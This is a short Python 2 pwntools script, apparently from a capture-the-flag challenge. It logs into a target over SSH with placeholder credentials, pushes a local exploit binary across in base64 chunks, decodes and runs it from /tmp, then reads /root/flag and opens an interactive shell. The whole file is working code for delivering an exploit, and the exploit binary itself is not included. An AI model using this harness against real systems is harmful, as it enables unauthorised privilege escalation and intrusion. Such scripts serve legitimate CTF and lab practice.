#!/bin/env python2

from pwn import *

print "usage: remote.py target"
host = sys.argv[1]

sploit = base64.b64encode(open("./exp", "rb").read())

r = ssh(host=host, user="username", password="passwd")
#print r.readuntil("/ $")
sh = r.shell()
print ("Waiting 10 seconds for vm startup")
sleep(5)
sh.sendline("cat > /tmp/sploit.b64 << EOF")
chunks = len(sploit)/1022
for x in range(chunks+1):
    print("Sending chunk %d/%d" % (x,chunks))
    sh.sendline(sploit[x*1022:(x+1)*1022])
sleep(1)
sh.sendline("EOF")
sleep(1)
sh.sendline("base64 -d /tmp/sploit.b64 > /tmp/sploit")
sh.sendline("chmod +x /tmp/sploit")
sh.sendline("/tmp/sploit")
sh.sendline("cat /root/flag")
sh.interactive()


